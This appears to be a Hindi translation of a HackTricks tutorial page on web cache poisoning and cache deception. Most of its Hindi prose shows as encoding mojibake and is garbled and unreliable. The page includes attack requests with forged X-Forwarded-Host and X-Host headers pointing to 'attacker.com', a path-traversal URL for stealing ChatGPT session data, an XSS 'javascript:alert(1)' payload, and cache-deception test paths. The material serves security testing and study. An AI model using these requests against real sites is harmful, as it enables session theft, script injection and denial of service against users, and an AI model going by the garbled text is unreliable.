[**рдЗрд╕ рд▓реЗрдЦрди рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) рдХрд┐ рдХреИрд╕реЗ рдПрдХ OpenAI API рдХреБрдВрдЬреА рдЪреЛрд░реА рдХреА рдЬрд╛ рд╕рдХрддреА рдереА рдПрдХ URL рдХреЗ рд╕рд╛рде `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` рдХреНрдпреЛрдВрдХрд┐ `/share/*` рдХреЗ рд╕рдорд╛рди рдХреБрдЫ рднреА рд╣реЛрдиреЗ рдкрд░ рдХреНрд▓рд╛рдЙрдбрдлреНрд▓реЗрдпрд░ URL рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрд░рдиреЗ рдХреЗ рдмрд┐рдирд╛ рдХреИрд╢ рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рддрдХ рдЕрдиреБрд░реЛрдз рдкрд╣реБрдВрдЪрдиреЗ рдкрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдПрдХ рдХреИрд╢ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХрдИ рдЕрдирдХреА рдЗрдирдкреБрдЯ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рдЖрдк `X-Forwarded-Host` рдХреЛ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЛрдореЗрди рдкрд░ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ `X-Forwarded-Scheme` рдХреЛ `http` рдкрд░ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВред **рдЕрдЧрд░** **рд╕рд░реНрд╡рд░** рд╕рднреА **HTTP** рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ **HTTPS** рдкрд░ рдлреЙрд░рд╡рд░реНрдб рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ `X-Forwarded-Scheme` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред рддреЛ рдЖрдк рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рдкреГрд╖реНрда рдХреЛ рдХрд╣рд╛рдВ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдЙрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### рд╕реАрдорд┐рдд `Vary` рд╣реЗрдбрд░ рдХрд╛ рд╢реЛрд╖рдг

рдпрджрд┐ рдЖрдкрдиреЗ рдкрд╛рдпрд╛ рд╣реИ рдХрд┐ **`X-Host`** рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ JS рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **`Vary`** рд╣реЗрдбрд░ **`User-Agent`** рдХреЛ рджрд░реНрд╢рд╛ рд░рд╣рд╛ рд╣реИред рддреЛ, рдЖрдкрдХреЛ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдирд┐рдХрд╛рд▓рдиреЗ рдФрд░ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╢ рдХреЛ рджреБрд╖рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### HTTP Request Smuggling рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ HTTP Cache Poisoning рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛

рдпрд╣рд╛рдБ рд╕реАрдЦреЗрдВ рдХрд┐ [HTTP Request Smuggling рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ Cache Poisoning рд╣рдорд▓реЗ рдХреИрд╕реЗ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)ред

### Web Cache Poisoning рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкрд░реАрдХреНрд╖рдг

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрдИ рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдЪреНрдЪ рд╕рдорд╛рдпреЛрдЬрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдСрдЯреЛрдореЗрдЯрд┐рдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рд╡рдВрд▓рд░рдмрд▓ рдЙрджрд╛рд╣рд░рдг

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS рдиреЗ URL рдХреЗ рднреАрддрд░ рдлреНрд░реЗрдЧрдореЗрдВрдЯ рдХреЛ рд╕реНрдЯреНрд░рд┐рдк рди рдХрд░рддреЗ рд╣реБрдП рдлреЙрд░рд╡рд░реНрдб рдХрд┐рдпрд╛ рдФрд░ рдХреЗрд╡рд▓ рд╣реЛрд╕реНрдЯ, рдкрде рдФрд░ рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╢ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХреА (рдлреНрд░реЗрдЧрдореЗрдВрдЯ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реБрдП)ред рдЗрд╕рд▓рд┐рдП рдЕрдиреБрд░реЛрдз `/#/../?r=javascript:alert(1)` рдХреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛ рдЬреИрд╕реЗ `/#/../?r=javascript:alert(1)` рдФрд░ рдХреИрд╢ рдХреБрдВрдЬреА рдореЗрдВ рдЗрд╕рдХреЗ рднреАрддрд░ рдкреЗрд▓реЛрдб рдирд╣реАрдВ рдерд╛, рдХреЗрд╡рд▓ рд╣реЛрд╕реНрдЯ, рдкрде рдФрд░ рдХреНрд╡реЗрд░реА рдереЗред

### GitHub CP-DoS

рдХрдВрдЯреЗрдВрдЯ-рдЯрд╛рдЗрдк рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рдмреБрд░рд╛ рдорд╛рди рднреЗрдЬрдиреЗ рд╕реЗ 405 рдХреИрд╢ рдЬрд╡рд╛рдм рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рдерд╛ред рдХреИрд╢ рдХреБрдВрдЬреА рдореЗрдВ рдХреБрдХреА рд╢рд╛рдорд┐рд▓ рдереА рдЗрд╕рд▓рд┐рдП рдХреЗрд╡рд▓ рдЕрдирдЕрде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред

### GitLab + GCP CP-DoS

GitLab рд╕реНрдерд┐рд░ рд╕рд╛рдордЧреНрд░реА рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GCP рдмрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред **GCP Buckets** рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ **рд╣реЗрдбрд░ `x-http-method-override`**ред рдЗрд╕рд▓рд┐рдП рд╣реЗрдбрд░ `x-http-method-override: HEAD` рднреЗрдЬрдиреЗ рд╕реЗ рд╕рдВрдХреЗрдд рдХреИрд╢ рдХреЛ рдЦрд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░ рд▓реМрдЯрдиреЗ рдореЗрдВ рдмрджрд▓ рд╕рдХрддрд╛ рдерд╛ред рдпрд╣ рдпрд╣ рднреА рд╡рд┐рдзрд┐ `PURGE` рдХрд╛ рд╕рдорд░реНрдерди рдХрд░ рд╕рдХрддрд╛ рдерд╛ред

### Rack Middleware (Ruby on Rails)

Ruby on Rails рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЕрдХреНрд╕рд░ Rack рдорд┐рдбрд▓рд╡реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред Rack рдХреЛрдб рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп **`x-forwarded-scheme`** рд╣реЗрдбрд░ рдХреЗ рдорд╛рди рдХреЛ рд▓реЗрдирд╛ рдФрд░ рдЗрд╕реЗ рдЕрдиреБрд░реЛрдз рдХреА рдпреЛрдЬрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реИред рдЬрдм рд╣реЗрдбрд░ `x-forwarded-scheme: http` рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ 301 рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╕рдорд╛рди рд╕реНрдерд╛рди рдкрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдкрд░ рдПрдХ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕реЗрд╡рд╛ (DoS) рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдПрдкреНрд▓рд┐рдХреЗрд╢рди `X-forwarded-host` рд╣реЗрдбрд░ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### 403 рдФрд░ рд╕реНрдЯреЛрд░реЗрдЬ рдмрдХреЗрдЯреНрд╕

рдкрд╣рд▓реЗ Cloudflare рдиреЗ 403 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреИрд╢ рдХреА рдереАред S3 рдпрд╛ Azure Storage Blobs рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдкрд░ рдЧрд▓рдд Authorization рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде 403 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓рддреА рдереА рдЬреЛ рдХреИрд╢ рд╣реЛ рдЬрд╛рддреА рдереАред рд╣рд╛рд▓рд╛рдВрдХрд┐ Cloudflare рдиреЗ 403 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреИрд╢ рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджрд┐рдпрд╛ рд╣реИ, рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдЕрдиреНрдп рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рдЕрдм рднреА рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Keyed Parameters рдбрд╛рд▓рдирд╛

рдХреИрд╢ рдЕрдХреНрд╕рд░ рдХреИрд╢ рдХреБрдВрдЬреА рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ GET рдкреИрд░рд╛рдореАрдЯрд░ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Fastly's Varnish рдиреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ `size` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреИрд╢ рдХрд┐рдпрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдПрдХ URL-encoded рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдкреИрд░рд╛рдореАрдЯрд░ (рдЬреИрд╕реЗ `siz%65`) рднреА рдПрдХ рдЧрд▓рдд рдорд╛рди рдХреЗ рд╕рд╛рде рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдХреИрд╢ рдХреБрдВрдЬреА рд╕рд╣реА `size` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддреА рдереАред рдлрд┐рд░ рднреА, рдмреИрдХрдПрдВрдб рдорд╛рди рдХреЛ URL-encoded рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░реЗрдЧрд╛ред рдЗрд╕ рджреВрд╕рд░реЗ `size` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ URL-encoding рдХрд░рдиреЗ рд╕реЗ рдХреИрд╢ рджреНрд╡рд╛рд░рд╛ рдЗрд╕рдХрд╛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ рд▓реЗрдХрд┐рди рдмреИрдХрдПрдВрдб рджреНрд╡рд╛рд░рд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ред рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ 0 рдХрд╛ рдорд╛рди рджреЗрдиреЗ рд╕реЗ рдПрдХ рдХреИрд╢рдпреЛрдЧреНрдп 400 рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рдереАред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ рдирд┐рдпрдо

рдХреБрдЫ рдбреЗрд╡рд▓рдкрд░ рдЙрдЪреНрдЪ-рдЯреНрд░реИрдлрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рдЬреИрд╕реЗ FFUF рдпрд╛ Nuclei рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдПрдЬреЗрдВрдЯ рдХреЗ рдореИрдЪрд┐рдВрдЧ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рд▓реЛрдб рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд░реЛрдирд┐рдХрд▓реА, рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреИрд╢ рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдФрд░ DoS рдЬреИрд╕реА рдЬреЛрдЦрд┐рдо рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рдЕрд╡реИрдз рд╣реЗрдбрд░ рдлрд╝реАрд▓реНрдб

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) рд╣реЗрдбрд░ рдирд╛рдореЛрдВ рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░реНрдп рд╡рд░реНрдгреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдирд┐рд░реНрджрд┐рд╖реНрдЯ **tchar** рд╕реАрдорд╛ рдХреЗ рдмрд╛рд╣рд░ рд╡рд░реНрдгреЛрдВ рд╕реЗ рдпреБрдХреНрдд рд╣реЗрдбрд░реНрд╕ рдХреЛ рдЖрдо рддреМрд░ рдкрд░ 400 рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд░реВрдк рд╕реЗ, рд╕рд░реНрд╡рд░ рд╣рдореЗрд╢рд╛ рдЗрд╕ рдорд╛рдирдХ рдХрд╛ рдкрд╛рд▓рди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдПрдХ рдкреНрд░рдореБрдЦ рдЙрджрд╛рд╣рд░рдг рдЕрдХрд╛рдорд╛рдИ рд╣реИ, рдЬреЛ рдЕрд╡реИрдз рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рд╣реЗрдбрд░реНрд╕ рдХреЛ рдЖрдЧреЗ рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА 400 рддреНрд░реБрдЯрд┐ рдХреЛ рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ, рдЬрдм рддрдХ `cache-control` рд╣реЗрдбрд░ рдореМрдЬреВрдж рди рд╣реЛред рдПрдХ рдРрд╕рд╛ рдкреИрдЯрд░реНрди рдЦреЛрдЬрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд╣рд╛рдВ рдЕрд╡реИрдз рд╡рд░реНрдг рдХреЗ рд╕рд╛рде рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рд╕реЗ, рдЬреИрд╕реЗ `\`, рдПрдХ рдХреИрд╢рдпреЛрдЧреНрдп 400 рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рдереАред

### рдирдП рд╣реЗрдбрд░реНрд╕ рдЦреЛрдЬрдирд╛

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА

рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ **рдЙрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдЬреЛ рдЙрдирдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рдПрдВ**ред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдЬреИрд╕реЗ `.css`, `.js`, `.png` рдЖрджрд┐ рдЖрдо рддреМрд░ рдкрд░ **рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк `www.example.com/profile.php/nonexistent.js` рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВ рддреЛ рдХреИрд╢ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `.js` **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рджреЗрдЦрддрд╛ рд╣реИред рд▓реЗрдХрд┐рди, рдпрджрд┐ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** _www.example.com/profile.php_ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рдЙрди рд╕рд╛рдордЧреНрд░рд┐рдпреЛрдВ рдХреЛ **рдЪреБрд░рд╛** рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдиреНрдп рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЪреАрдЬреЗрдВ:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _
{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
